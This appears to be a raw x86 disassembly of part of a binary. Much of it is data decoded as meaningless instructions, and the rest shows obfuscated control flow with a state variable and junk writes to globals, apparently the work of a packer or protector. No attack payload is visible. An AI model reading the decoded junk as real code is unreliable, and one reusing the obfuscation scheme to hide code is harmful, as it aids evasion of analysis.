  409128:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409129:	sbb    BYTE PTR [esi+eiz*2-0x1e],ch
  40912d:	xchg   edi,eax
  40912e:	mov    bl,0x42
  409130:	fst    DWORD PTR [edi]
  409132:	sar    BYTE PTR [ebx-0x2d80696f],0xe2
  409139:	std    
  40913a:	cmp    al,0xf4
  40913c:	leave  
  40913d:	mov    BYTE PTR [esi+0x7271717],0x10
  409144:	fwait
  409145:	inc    esp
  409146:	push   dx
  409148:	je     0x409132
  40914a:	popa   
  40914b:	int    0x8d
  40914d:	pop    esi
  40914e:	and    BYTE PTR [ebp+0x24],bh
  409151:	or     cl,ch
  409153:	push   es
  409154:	mov    BYTE PTR [ebx],dh
  409156:	xchg   edx,eax
  409157:	lock xchg esi,eax
  409159:	stc    
  40915a:	mov    dh,0xa4
  40915c:	cli    
  40915d:	jbe    0x409149
  40915f:	and    al,0x81
  409161:	mov    ecx,0xf341ae42
  409166:	out    dx,al
  409167:	ins    DWORD PTR es:[edi],dx
  409168:	mov    ch,0x47
  40916a:	sti    
  40916b:	bswap  ebp
  40916d:	cmp    bl,BYTE PTR [esi+0x236c1cf1]
  409173:	mov    ch,0xd4
  409175:	xlat   BYTE PTR ds:[ebx]
  409176:	adc    eax,0x60c264bf
  40917b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40917c:	pushw  es
  40917e:	inc    eax
  40917f:	out    0x51,eax
  409181:	jle    0x409120
  409183:	push   edi
  409184:	cs inc ebp
  409186:	jmp    0x9057885d
  40918b:	jmp    0x409185
  40918d:	call   0xd57906d1
  409192:	popa   
  409193:	inc    eax
  409194:	jns    0x4091ee
  409196:	dec    edx
  409198:	pop    ss
  409199:	mov    DWORD PTR [edi+ebp*1],ebp
  40919c:	fs jmp 0xd970:0x1e8c14a7
  4091a4:	sbb    ecx,eax
  4091a6:	xor    al,0x88
  4091a8:	mov    al,0xc8
  4091aa:	in     al,dx
  4091ab:	inc    esi
  4091ac:	inc    ecx
  4091ad:	inc    esp
  4091ae:	adc    al,0x1d
  4091b0:	lds    esi,FWORD PTR [ebp+0x42140521]
  4091b6:	xchg   BYTE PTR es:[ebx+ecx*4+0x74d31b8b],ah
  4091be:	mov    bl,BYTE PTR ds:0x5e3ac809
  4091c4:	sbb    eax,0xe1d19ec0
  4091c9:	mov    DWORD PTR [ecx-0x1841c42],ecx
  4091cf:	or     bh,BYTE PTR [eax-0x19de8c4b]
  4091d5:	outs   dx,DWORD PTR ds:[esi]
  4091d6:	bound  esi,QWORD PTR [ecx]
  4091d8:	jnp    0x4091fd
  4091da:	xchg   ecx,eax
  4091db:	pop    esi
  4091dc:	out    dx,eax
  4091dd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4091de:	test   BYTE PTR [edx-0x5f59b18],0x86
  4091e5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4091e6:	xchg   esp,eax
  4091e7:	or     esp,DWORD PTR [edx*4-0x44a5f0a2]
  4091ee:	and    eax,DWORD PTR [eax]
  4091f0:	test   DWORD PTR [edx-0x2],ebx
  4091f3:	ret    
  4091f4:	inc    esp
  4091f5:	jl     0x409251
  4091f7:	sbb    al,0xe2
  4091f9:	jmp    0xea98463
  4091fe:	cmp    al,0xb1
  409200:	cmp    al,0x1d
  409202:	cdq    
  409203:	push   edi
  409204:	hlt    
  409205:	test   al,0xc5
  409207:	je     0x409287
  409209:	or     al,dl
  40920b:	jge    0x4091c1
  40920d:	fidiv  WORD PTR [ecx-0x28b128a0]
  409213:	inc    ecx
  409214:	imul   eax,DWORD PTR [edi+0x2388b108],0x51225151
  40921e:	sub    ecx,eax
  409220:	data16 jo 0x4091a5
  409223:	or     bh,cl
  409225:	cdq    
  409226:	push   ds
  409227:	mul    bl
  409229:	adc    bh,cl
  40922b:	(bad)  
  40922c:	push   edx
  40922d:	sbb    BYTE PTR [edi],0x9d
  409230:	pop    ds
  409231:	sbb    edx,DWORD PTR [ebx]
  409233:	fst    DWORD PTR [eax+0x69]
  409236:	aas    
  409237:	add    edx,DWORD PTR [edx-0x8]
  40923a:	nop
  40923b:	fiadd  DWORD PTR [edx+0x3c]
  40923e:	pusha  
  40923f:	outs   dx,DWORD PTR ds:[esi]
  409240:	jmp    0x409211
  409242:	(bad)  
  409243:	mov    edi,0x48b6ed4f
  409248:	adc    BYTE PTR [ecx],cl
  40924a:	mov    ecx,0xd0f874b9
  40924f:	data16 xor BYTE PTR [ebx-0x48774024],ah
  409256:	jae    0x4091f0
  409258:	test   dh,bh
  40925a:	sub    BYTE PTR [eax],dl
  40925c:	mov    esp,0x4271efb6
  409261:	test   al,0x4c
  409263:	jnp    0x40920a
  409265:	mov    esp,0xadf0bd4a
  40926a:	fs sub edx,DWORD PTR fs:[eax+ecx*1+0x60]
  409270:	out    0x80,eax
  409272:	repz arpl dx,cx
  409275:	push   esp
  409276:	ss jecxz 0x4092ec
  409279:	jmp    ebp
  40927b:	das    
  40927c:	pop    ds
  40927d:	push   eax
  40927e:	out    dx,eax
  40927f:	lock mov ah,0xef
  409282:	mov    al,0x8
  409284:	mov    esi,0xb9b0159b
  409289:	pop    edx
  40928a:	xchg   BYTE PTR [edi*8+0x53193b0],ah
  409291:	mov    eax,edi
  409293:	pusha  
  409294:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409295:	jbe    0x40925d
  409297:	in     al,0xc4
  409299:	enter  0x811d,0x72
  40929d:	inc    ebx
  40929e:	mov    WORD PTR ds:0x720c6c38,gs
  4092a4:	adc    eax,DWORD PTR [edx-0x1]
  4092a7:	xchg   esi,eax
  4092a8:	aad    0xab
  4092aa:	mov    ecx,0x47de29d7
  4092af:	ret    
  4092b0:	stc    
  4092b1:	mov    ds:0x70e2b342,al
  4092b6:	mov    dh,BYTE PTR [edx]
  4092b8:	sbb    DWORD PTR cs:[ebp-0x6e7de52],eax
  4092bf:	sti    
  4092c0:	sar    dh,cl
  4092c2:	(bad)  
  4092c3:	pushf  
  4092c4:	push   edx
  4092c5:	hlt    
  4092c6:	xor    al,bh
  4092c8:	jne    0x4092d8
  4092ca:	mov    edx,esi
  4092cc:	lahf   
  4092cd:	mov    bl,0xf2
  4092cf:	sbb    al,0x19
  4092d1:	into   
  4092d2:	push   cs
  4092d3:	sub    DWORD PTR ds:0x8f5c2ecc,eax
  4092d9:	into   
  4092da:	xchg   BYTE PTR [edi-0x2f],cl
  4092dd:	adc    BYTE PTR [esi+0x39d21088],al
  4092e3:	test   al,0x32
  4092e5:	jecxz  0x40930b
  4092e7:	iret   
  4092e8:	jne    0x4092d4
  4092ea:	add    eax,0x8b9033bb
  4092ef:	inc    ecx
  4092f0:	cmp    al,0x30
  4092f2:	std    
  4092f3:	push   ecx
  4092f4:	pop    es
  4092f5:	repnz popa 
  4092f7:	fmul   QWORD PTR [ebx]
  4092f9:	sbb    BYTE PTR [edi-0x39],al
  4092fc:	das    
  4092fd:	inc    edi
  4092fe:	jbe    0x40933b
  409300:	push   edi
  409301:	or     ebx,DWORD PTR [eax-0x8]
  409304:	push   ds
  409305:	repnz ds push ebx
  409308:	push   0x708507eb
  40930d:	or     al,0x40
  40930f:	stc    
  409310:	jmp    0xb1fe0122
  409315:	inc    ecx
  409316:	test   eax,0x4e3033d8
  40931b:	ret    0x31e0
  40931e:	or     al,0x68
  409320:	xor    BYTE PTR [edi-0x3b],ah
  409323:	das    
  409324:	pop    edx
  409325:	adc    eax,0xea47139e
  40932a:	(bad)  
  40932b:	stos   BYTE PTR es:[edi],al
  40932c:	les    esi,FWORD PTR [edx-0x6bd79204]
  409332:	xor    eax,0x324f6c3
  409337:	outs   dx,BYTE PTR ds:[esi]
  409338:	adc    esi,DWORD PTR [esi]
  40933a:	push   eax
  40933b:	pop    ds
  40933c:	inc    BYTE PTR [ebx-0x74dcd567]
  409342:	inc    ebp
  409343:	in     al,dx
  409344:	jmp    0x4084bd
  409349:	mov    eax,DWORD PTR [ebp-0xc]
  40934c:	mov    edx,DWORD PTR [ebp-0x18]
  40934f:	xor    eax,edx
  409351:	cmp    eax,0xa08c1d35
  409356:	je     0x4084ba
  40935c:	mov    eax,DWORD PTR [ebp-0x10]
  40935f:	add    DWORD PTR [eax],0x7403501
  409365:	jmp    0x4084ba
  40936a:	mov    eax,DWORD PTR [ebp-0x1c]
  40936d:	cmp    DWORD PTR [eax],edi
  40936f:	je     0x4084ba
  409375:	mov    eax,0x800f1c9c
  40937a:	jmp    0x4084c1
  40937f:	push   ebp
  409380:	mov    ebp,esp
  409382:	sub    esp,0x60
  409385:	adc    eax,DWORD PTR ds:0x433763
  40938b:	jmp    0x4094bf
  409390:	add    al,0xbb
  409392:	js     0x4093e4
  409394:	inc    ebx
  409395:	push   ebx
  409396:	push   esp
  409397:	dec    ebx
  409398:	xor    al,0xcd
  40939a:	in     al,dx
  40939b:	(bad)  
  40939c:	hlt    
  40939d:	retf   0x6898
  4093a0:	sahf   
  4093a1:	in     eax,dx
  4093a2:	jl     0x409420
  4093a4:	adc    eax,0xba7c7c7f
  4093a9:	and    DWORD PTR [ecx],eax
  4093ab:	sub    BYTE PTR [edx+eiz*1+0x54],bh
  4093af:	inc    ebp
  4093b0:	into   
  4093b1:	stc    
  4093b2:	mov    edi,DWORD PTR [ebx-0x2cd92fe3]
  4093b8:	clc    
  4093b9:	mov    bl,0xe8
  4093bb:	adc    al,0xda
  4093bd:	in     al,dx
  4093be:	mov    cl,0x92
  4093c0:	cmp    DWORD PTR [edi+0x4a],edi
  4093c3:	stos   DWORD PTR es:[edi],eax
  4093c4:	adc    ebx,DWORD PTR [edx+0x7]
  4093c7:	jb     0x4093d5
  4093c9:	adc    al,0xde
  4093cb:	inc    eax
  4093cc:	jae    0x409391
  4093ce:	cmp    ebx,ebp
  4093d0:	jle    0x40935f
  4093d2:	inc    edi
  4093d3:	jmp    FWORD PTR [ecx+0x55241a87]
  4093d9:	cwde   
  4093da:	sbb    al,BYTE PTR [ebx+ebx*2-0x45]
  4093de:	(bad)  
  4093e0:	sub    BYTE PTR [edi+0x6990c83d],ch
  4093e6:	aad    0xd1
  4093e8:	jb     0x40936e
  4093ea:	bound  esp,QWORD PTR [esi]
  4093ec:	jmp    0xbe1eab75
  4093f1:	and    ebx,DWORD PTR [edi+0x33a3f9db]
  4093f7:	mov    edx,0xcac63d82
  4093fc:	bound  ebp,QWORD PTR [ebx+0x3e]
  4093ff:	add    bh,BYTE PTR [esi-0x2f494aa2]
  409405:	jns    0x4093ba
  409407:	inc    edi
  409408:	xor    al,0xd8
  40940a:	int3   
  40940b:	stc    
  40940c:	jno    0x40944d
  40940e:	wrmsr  
  409410:	adc    dl,BYTE PTR [edi+eax*2]
  409413:	leave  
  409414:	out    dx,eax
  409415:	or     DWORD PTR [ecx+0x6a],0x2392332c
  40941c:	stos   BYTE PTR es:[edi],al
  40941d:	ret    0xe148
  409420:	and    DWORD PTR [edi],eax
  409422:	mov    cl,0xf2
  409424:	stos   BYTE PTR es:[edi],al
  409425:	adc    cl,BYTE PTR [edx]
  409427:	aas    
  409428:	pusha  
  409429:	push   esi
  40942a:	cmovnp ebp,DWORD PTR [ebp-0x1e09e908]
  409431:	inc    edx
  409432:	dec    ecx
  409433:	test   al,0xe3
  409435:	xchg   edx,eax
  409436:	fldcw  WORD PTR [esi+0x7b]
  409439:	mov    dl,0x38
  40943b:	adc    DWORD PTR [esi+edx*1],eax
  40943e:	daa    
  40943f:	iret   
  409440:	adc    BYTE PTR [ebp+0x2950d31e],ah
  409446:	mov    ah,0x52
  409448:	aam    0x66
  40944a:	jle    0x409479
  40944c:	jns    0x40949d
  40944e:	push   edx
  40944f:	call   0x3d91:0xb73039f9
  409456:	mov    BYTE PTR [edi-0x67],ch
  409459:	arpl   bx,si
  40945b:	mov    ecx,0xd02f8874
  409460:	sub    dh,BYTE PTR [esi-0x1]
  409463:	fsincos 
  409465:	outs   dx,BYTE PTR ds:[esi]
  409466:	and    edi,DWORD PTR [eax+0x2a]
  409469:	fcomip st,st(3)
  40946b:	inc    ebx
  40946c:	ret    
  40946d:	call   0x8e2092be
  409472:	jb     0x4094cb
  409474:	pop    ss
  409475:	or     ecx,ebp
  409477:	js     0x409467
  409479:	nop
  40947a:	(bad)  
  40947b:	cmp    eax,0xe01f800f
  409480:	adc    edx,esp
  409482:	adc    BYTE PTR [edx+edx*2+0x6f],0x76
  409487:	loope  0x4094c3
  409489:	add    al,0x25
  40948b:	rcr    edx,0x43
  40948e:	adc    al,0xce
  409490:	push   edx
  409491:	mov    bl,0xfa
  409493:	and    edx,DWORD PTR [ebx]
  409495:	sbb    BYTE PTR [edi+0x70],cl
  409498:	or     DWORD PTR [ebx],esp
  40949a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40949b:	inc    edi
  40949c:	jge    0x40944d
  40949e:	jno    0x409448
  4094a0:	xchg   esi,eax
  4094a1:	pop    ebp
  4094a2:	(bad)  
  4094a3:	xor    al,0x98
  4094a5:	pop    esi
  4094a6:	adc    al,0x64
  4094a8:	or     al,0x89
  4094aa:	jo     0x4094b3
  4094ac:	or     eax,0x986a0f33
  4094b1:	pop    edi
  4094b2:	sub    DWORD PTR [ebx],eax
  4094b4:	leave  
  4094b5:	pop    edx
  4094b6:	fs fs pand mm6,mm3
  4094bb:	retf   
  4094bc:	fld    DWORD PTR [ebp+0x69]
  4094bf:	mov    eax,DWORD PTR [ebp+0x8]
  4094c2:	or     DWORD PTR ds:0x433767,0xc38
  4094cc:	push   ebx
  4094cd:	adc    DWORD PTR ds:0x4336d7,0x6147
  4094d7:	push   esi
  4094d8:	mov    esi,0x7510853
  4094dd:	add    DWORD PTR ds:0x4337e7,0x296a
  4094e7:	xor    eax,esi
  4094e9:	and    ebx,0x43d6
  4094ef:	mov    ebx,0x32729a
  4094f4:	and    DWORD PTR ds:0x4336df,0x4336d7
  4094fe:	add    eax,ebx
  409500:	adc    DWORD PTR ds:0x4337df,0x1959
  40950a:	push   edi
  40950b:	or     DWORD PTR ds:0x43372b,ecx
  409511:	mov    DWORD PTR [ebp-0x18],eax
  409514:	and    DWORD PTR ds:0x4336db,0x4f47
  40951e:	mov    edi,DWORD PTR [ebp+0x8]
  409521:	xor    edi,esi
  409523:	sbb    DWORD PTR ds:0x43372f,0x4337eb
  40952d:	mov    DWORD PTR [ebp-0xc],0xf89c85f5
  409534:	or     DWORD PTR ds:0x43372f,0x30d7
  40953e:	mov    DWORD PTR [ebp-0x10],0xf89c8735
  409545:	add    DWORD PTR ds:0x4336e7,0x4337af
  40954f:	add    edi,ebx
  409551:	jmp    0x4099a2
  409556:	mov    DWORD PTR ds:0x433717,0x217e
  409560:	cmp    edi,0x40
  409563:	mov    DWORD PTR ds:0x43376f,0x49f
  40956d:	jne    0x4095a6
  409573:	mov    DWORD PTR ds:0x4337eb,ecx
  409579:	mov    eax,ds:0x413996
  40957e:	mov    eax,DWORD PTR [eax]
  409580:	mov    DWORD PTR ds:0x4336e3,0x21e9
  40958a:	mov    DWORD PTR [ebp-0x14],eax
  40958d:	mov    eax,ds:0x413b9e
  409592:	mov    DWORD PTR ds:0x4337af,0x54b7
  40959c:	mov    eax,DWORD PTR [eax]
  40959e:	mov    DWORD PTR [ebp-0x18],eax
  4095a1:	jmp    0x409996
  4095a6:	mov    DWORD PTR ds:0x4336cb,0x76e8
  4095b0:	jmp    0x4096e4
  4095b5:	and    al,0x36
  4095b7:	popf   
  4095b8:	les    ebx,FWORD PTR [ebp-0x6f09829d]
  4095be:	lahf   
  4095bf:	jmp    0x40958c
  4095c1:	pop    ecx
  4095c2:	add    DWORD PTR [esi+0x7cecb772],edi
  4095c8:	jl     0x4095df
  4095ca:	jg     0x409648
  4095cc:	jl     0x4095aa
  4095ce:	mov    esi,ss
  4095d0:	mov    BYTE PTR [ebx],0x9c
  4095d3:	mov    ?,WORD PTR [ecx+0x5507def9]
  4095d9:	sub    al,0x57
  4095db:	data16 mov ch,0x45
  4095de:	mov    dh,0x49
  4095e0:	and    DWORD PTR [esi+0x7a55d211],ebp
  4095e6:	sbb    eax,0xf5c0e946
  4095eb:	into   
  4095ec:	fistp  QWORD PTR [ecx+0x289f288f]
  4095f2:	xor    DWORD PTR [edx*4-0x72a93e4a],0xa05bfd9f
  4095fd:	pop    eax
  4095fe:	sub    edx,DWORD PTR ss:[eax+0x7]
  409602:	push   ds
  409603:	add    BYTE PTR [ebp+0x64],0xb2
  409607:	push   ecx
  409608:	mov    ecx,0xfa416b64
  40960d:	xchg   ebp,eax
  40960e:	cmp    ebx,edx
  409610:	push   edx
  409611:	pop    ss
  409612:	popf   
  409613:	loopne 0x409693
  409615:	add    eax,0x3e8519a2
  40961a:	adc    eax,0xcc6d794e
  40961f:	fcmovne st,st(4)
  409621:	add    eax,DWORD PTR [ebp-0x1a]
  409624:	mov    ch,0xcc
  409626:	add    edi,esi
  409628:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409629:	mov    dh,0x72
  40962b:	cs sub eax,0xa84d9d2e
  409631:	nop
  409632:	scas   eax,DWORD PTR es:[edi]
  409633:	add    DWORD PTR [eax],edi
  409635:	cmp    eax,0x59dd3003
  40963a:	fiadd  WORD PTR [edi]
  40963c:	ss xor ch,BYTE PTR ss:[edi+0x2a]
  409641:	jg     0x409620
  409643:	mov    DWORD PTR [eax-0x3d],0x3133a9b7
  40964a:	add    DWORD PTR [eax-0x1d],esi
  40964d:	cmc    
  40964e:	and    BYTE PTR [ebp+0x5b],bh
  409651:	imul   edi,DWORD PTR [ecx],0xc8940b0a
  409657:	adc    DWORD PTR [edx+0x2b79f6a8],ebp
  40965d:	sub    bl,BYTE PTR [ebx]
  40965f:	sahf   
  409660:	dec    esp
  409661:	inc    ebp
  409662:	pop    esi
  409663:	popa   
  409664:	jmp    0x40967d
  409666:	sub    eax,0xf7bc3663
  40966b:	inc    ebp
  40966c:	jg     0x40964d
  40966e:	pop    edx
  40966f:	in     al,dx
  409670:	inc    ebx
  409671:	in     eax,dx
  409672:	loope  0x40967f
  409674:	stc    
  409675:	xchg   edi,eax
  409676:	in     al,dx
  409677:	(bad)  
  409679:	sahf   
  40967a:	jbe    0x4095ff
  40967c:	ja     0x409668
  40967e:	or     al,0x35
  409680:	sbb    eax,DWORD PTR [eax]
  409682:	xchg   edx,eax
  409683:	jg     0x409668
  409685:	scas   al,BYTE PTR es:[edi]
  409686:	in     eax,0x49
  409688:	std    
  409689:	mov    al,0xec
  40968b:	test   BYTE PTR [edx+edx*4+0x47],ah
  40968f:	in     al,0x6
  409691:	mov    dl,0x2f
  409693:	mov    WORD PTR ds:0xabcdeb62,cs
  409699:	(bad)  
  40969a:	retf   0x19b3
  40969d:	pop    ss
  40969e:	cmp    eax,0xfc81131c
  4096a3:	xchg   DWORD PTR [eax-0x5f2601d2],edi
  4096a9:	retf   0xcc6a
  4096ac:	sub    al,0xf3
  4096ae:	adc    ah,dl
  4096b0:	call   0xb07a:0x45a4f90b
  4096b7:	mov    eax,ds:0xba0deda4
  4096bc:	adc    BYTE PTR [esi+eiz*8-0x5e],bh
  4096c0:	and    eax,0xd2b794a6
  4096c5:	pop    es
  4096c6:	or     edi,esp
  4096c8:	outs   dx,BYTE PTR ds:[esi]
  4096c9:	mov    BYTE PTR [edi+0x4a3874ea],bl
  4096cf:	aaa    
  4096d0:	sub    esp,esi
  4096d2:	and    al,0x86
  4096d4:	sbb    al,0x7b
  4096d6:	in     eax,0x30
  4096d8:	mov    eax,0xf26e75c1
  4096dd:	fcmovb st,st(6)
  4096df:	in     eax,0xda
  4096e1:	in     al,0x9d
  4096e3:	ins    DWORD PTR es:[edi],dx
  4096e4:	cmp    edi,0x33d
  4096ea:	mov    DWORD PTR ds:0x433757,0x197
  4096f4:	jne    0x409766
  4096fa:	and    DWORD PTR [ebp+0x8],0x0
  4096fe:	mov    eax,DWORD PTR [ebp-0x8]
  409701:	or     DWORD PTR ds:0x4337a3,0x433763
  40970b:	sub    eax,DWORD PTR [ebp+0x8]
  40970e:	push   eax
  40970f:	mov    eax,ds:0x4337e3
  409714:	or     DWORD PTR ds:0x4337a3,eax
  40971a:	mov    eax,DWORD PTR [ebp-0x4]
  40971d:	add    DWORD PTR ds:0x4336bf,0x43372f
  409727:	add    eax,DWORD PTR [ebp+0x8]
  40972a:	sub    DWORD PTR ds:0x4337a7,0x433727
  409734:	push   eax
  409735:	dec    DWORD PTR ds:0x4336cb
  40973b:	call   0x4099bc
  409740:	mov    DWORD PTR ds:0x433797,0x29a7
  40974a:	inc    DWORD PTR [ebp+0x8]
  40974d:	cmp    DWORD PTR [ebp+0x8],0x52
  409751:	mov    DWORD PTR ds:0x4336df,0x7d48
  40975b:	jb     0x4096fe
  409761:	jmp    0x409996
  409766:	mov    DWORD PTR ds:0x43376f,0x5779
  409770:	cmp    edi,0x1a3
  409776:	mov    DWORD PTR ds:0x4337e7,0x175d
  409780:	jne    0x409964
  409786:	movzx  eax,BYTE PTR ds:0x4336bf
  40978d:	and    DWORD PTR ds:0x43372f,eax
  409793:	mov    DWORD PTR [ebp-0x60],0xf89c8539
  40979a:	add    DWORD PTR ds:0x4337af,ebx
  4097a0:	mov    eax,DWORD PTR [ebp-0x4]
  4097a3:	xor    DWORD PTR ds:0x43371f,0x2808
  4097ad:	mov    DWORD PTR [ebp-0x5c],eax
  4097b0:	sub    eax,DWORD PTR ds:0x433767
  4097b6:	mov    eax,DWORD PTR [ebp-0x8]
  4097b9:	mov    DWORD PTR [ebp-0x58],eax
  4097bc:	mov    eax,DWORD PTR [ebp-0xc]
  4097bf:	xor    eax,esi
  4097c1:	and    DWORD PTR ds:0x4337a7,0x5f09
  4097cb:	add    eax,ebx
  4097cd:	and    DWORD PTR ds:0x4336df,0x3046
  4097d7:	mov    DWORD PTR [ebp-0x54],eax
  4097da:	sbb    DWORD PTR ds:0x43376b,0x4337b3
  4097e4:	lea    eax,[ebp-0x1c]
  4097e7:	add    DWORD PTR ds:0x43379b,0x7d23
  4097f1:	mov    DWORD PTR [ebp-0x50],eax
  4097f4:	sub    eax,DWORD PTR ds:0x4336df
  4097fa:	mov    eax,DWORD PTR [ebp-0x60]
  4097fd:	or     DWORD PTR ds:0x433733,0x43372f
  409807:	xor    eax,esi
  409809:	add    eax,ebx
  40980b:	mov    DWORD PTR [ebp-0x60],eax
  40980e:	lea    eax,[ebp-0x60]
  409811:	push   eax
  409812:	mov    eax,DWORD PTR [ebp+0xc]
  409815:	jmp    0x409949
  40981a:	xchg   cl,bl
  40981c:	fs jg  0x409886
  40981f:	and    DWORD PTR [ecx+0x61],0x87fe859e
  409826:	aad    0x7a
  409828:	adc    BYTE PTR ds:0x7c7cef4c,bl
  40982e:	adc    eax,0xee7c7c7f
  409833:	ds cs inc esi
  409836:	xor    ch,bl
  409838:	fwait
  409839:	call   0xbbbc:0x822869f0
  409840:	fistp  DWORD PTR [esi-0x3b]
  409843:	add    edx,edi
  409845:	xor    bh,BYTE PTR [ebx-0x191736ca]
  40984b:	iret   
  40984c:	retf   0xa23d
  40984f:	mov    cl,0xcc
  409851:	inc    edi
  409852:	pusha  
  409853:	(bad)  
  409854:	jnp    0x4098ba
  409856:	rol    BYTE PTR [edi-0x5ed36385],0x16
  40985d:	sbb    edx,edx
  40985f:	aas    
  409860:	cld    
  409861:	sbb    edi,DWORD PTR [ebp-0x44]
  409864:	and    dh,dh
  409866:	pop    ss
  409867:	mov    eax,ds:0x1548e96b
  40986c:	cwde   
  40986d:	sub    BYTE PTR [ebx+0x5aec857e],al
  409873:	pop    ebx
  409874:	xor    al,0x39
  409876:	call   0xc571f140
  40987b:	int    0x73
  40987d:	cmc    
  40987e:	lea    ebp,[ecx]
  409880:	xor    ah,BYTE PTR [edx-0x44]
  409883:	jb     0x4098da
  409885:	push   ebx
  409886:	ins    BYTE PTR es:[edi],dx
  409887:	bound  edx,QWORD PTR [ebx-0x5c5cef04]
  40988d:	test   al,0x8a
  40988f:	mov    ds:0x530fad7a,eax
  409894:	(bad)  
  409895:	dec    eax
  409896:	jno    0x4098d9
  409898:	fwait
  409899:	mov    ch,0x90
  40989b:	rcr    esp,0x73
  40989e:	jmp    0xba92:0xcdfb23c9
  4098a5:	mov    ecx,0x1253ae9c
  4098aa:	mov    eax,ds:0x2bee71
  4098af:	mov    cl,0xdf
  4098b1:	mov    bl,0x7b
  4098b3:	jbe    0x40987e
  4098b5:	sub    eax,0x4c4ee884
  4098ba:	cmp    eax,0xde31bb63
  4098bf:	stos   DWORD PTR es:[edi],eax
  4098c0:	jbe    0x4098e4
  4098c2:	mov    eax,ds:0x89301a90
  4098c7:	hlt    
  4098c8:	sbb    BYTE PTR [edi],dh
  4098ca:	js     0x409889
  4098cc:	jg     0x409890
  4098ce:	or     dh,dh
  4098d0:	loopne 0x409883
  4098d2:	dec    esp
  4098d3:	call   0x9c3d:0x9119cabb
  4098da:	out    0x4a,eax
  4098dc:	pop    eax
  4098dd:	repnz ffreep st(5)
  4098e0:	and    BYTE PTR [eax],bl
  4098e2:	xor    al,0x0
  4098e4:	jecxz  0x409932
  4098e6:	adc    dh,BYTE PTR [eax-0x17]
  4098e9:	adc    dh,BYTE PTR [ebx+0x64]
  4098ec:	in     al,dx
  4098ed:	lock sbb DWORD PTR [edx-0x7],ebx
  4098f1:	adc    esi,ebp
  4098f3:	rcl    BYTE PTR [ebp+0x3f],0xe4
  4098f7:	ds scas al,BYTE PTR es:[edi]
  4098f9:	clc    
  4098fa:	loope  0x4098dc
  4098fc:	cdq    
  4098fd:	test   eax,0xc2944dc1
  409902:	pop    esi
  409903:	inc    edx
  409904:	mov    esp,0x5fd7477a
  409909:	pop    esp
  40990a:	int3   
  40990b:	inc    esi
  40990c:	mov    al,ds:0x52e81669
  409911:	sub    ah,BYTE PTR [ebx]
  409913:	out    dx,eax
  409914:	je     0x4098d9
  409916:	cli    
  409917:	jp     0x409973
  409919:	ja     0x4098c3
  40991b:	js     0x409957
  40991d:	push   0xffffff92
  40991f:	cmp    ch,BYTE PTR [edx+ebp*1+0x3c9a168f]
  409926:	mov    ds:0x54d856b1,al
  40992b:	add    ebp,DWORD PTR ss:[eax+edi*4]
  40992f:	int    0xba
  409931:	lds    esp,FWORD PTR [ebp-0x6fc0abc0]
  409937:	push   edx
  409938:	fwait
  409939:	inc    edi
  40993a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40993b:	xchg   edx,eax
  40993c:	sub    al,0xc2
  40993e:	inc    ebp
  40993f:	bound  eax,QWORD PTR [eax-0x77bb189f]
  409945:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409946:	dec    edx
  409947:	adc    ecx,esi
  409949:	xor    eax,esi
  40994b:	add    eax,ebx
  40994d:	push   eax
  40994e:	mov    eax,ds:0x413b36
  409953:	push   0x413a8c
  409958:	push   DWORD PTR [eax]
  40995a:	call   0x4100b5
  40995f:	jmp    0x409996
  409964:	cmp    edi,0x13d
  40996a:	jne    0x409996
  409970:	mov    eax,DWORD PTR [ebp-0x10]
  409973:	xor    eax,esi
  409975:	add    eax,ebx
  409977:	mov    DWORD PTR [ebp+0x8],eax
  40997a:	mov    eax,ds:0x413b16
  40997f:	mov    DWORD PTR [ebp+0x8],eax
  409982:	mov    eax,DWORD PTR [ebp-0x14]
  409985:	mov    DWORD PTR [ebp-0x4],eax
  409988:	mov    eax,DWORD PTR [ebp-0x4]
  40998b:	push   0x4
  40998d:	pop    ecx
  40998e:	sub    ecx,eax
  409990:	add    ecx,DWORD PTR [ebp-0x18]
  409993:	mov    DWORD PTR [ebp-0x8],ecx
  409996:	mov    eax,DWORD PTR [ebp+0xc]
  409999:	xor    eax,esi
  40999b:	lea    edi,[edi+eax*1+0x32729a]
  4099a2:	cmp    edi,0x50b
  4099a8:	jne    0x409556
  4099ae:	mov    eax,DWORD PTR [ebp+0xc]
  4099b1:	pop    edi
  4099b2:	xor    eax,esi
  4099b4:	pop    esi
  4099b5:	add    eax,ebx
  4099b7:	pop    ebx
  4099b8:	leave  
  4099b9:	ret    0x8
  4099bc:	push   ebp
  4099bd:	mov    ebp,esp
  4099bf:	sub    esp,0x44
  4099c2:	neg    edx
  4099c4:	push   edi
  4099c5:	mov    eax,DWORD PTR [ebp+0xc]
  4099c8:	mov    edi,DWORD PTR ds:0x4337b3
  4099ce:	sub    DWORD PTR ds:0x4336bf,edi
  4099d4:	mov    DWORD PTR [ebp-0x10],eax
  4099d7:	and    DWORD PTR ds:0x43376f,0x1af7
  4099e1:	mov    eax,DWORD PTR [ebp+0x8]
  4099e4:	mov    DWORD PTR [ebp+0x8],0xf89c8535
  4099eb:	and    DWORD PTR ds:0x4337af,ebx
  4099f1:	mov    DWORD PTR [ebp-0x20],0xf89c8534
  4099f8:	or     DWORD PTR ds:0x433733,ebx
  4099fe:	mov    edx,DWORD PTR [ebp+0x8]
  409a01:	add    DWORD PTR ds:0x4336cf,ebx
  409a07:	mov    DWORD PTR [ebp-0x40],eax
  409a0a:	mov    eax,0x7510853
  409a0f:	mov    DWORD PTR ds:0x433763,0x1e
  409a19:	cmp    DWORD PTR ds:0x433763,0x0
  409a20:	je     0x409a5e
  409a26:	cmp    DWORD PTR ds:0x433763,0x20
  409a2d:	jne    0x409a46
  409a33:	push   DWORD PTR [ebp-0xc]
  409a36:	push   0x43379b
  409a3b:	push   0x4dbc
  409a40:	call   DWORD PTR ds:0x412198
  409a46:	mov    edi,DWORD PTR ds:0x433763
  409a4c:	dec    edi
  409a4d:	mov    DWORD PTR ds:0x433763,edi
  409a53:	jmp    0x409a19
  409a58:	sbb    DWORD PTR ds:0x4337f3,ebx
  409a5e:	xor    edx,eax
  409a60:	and    DWORD PTR ds:0x43375b,0x1370
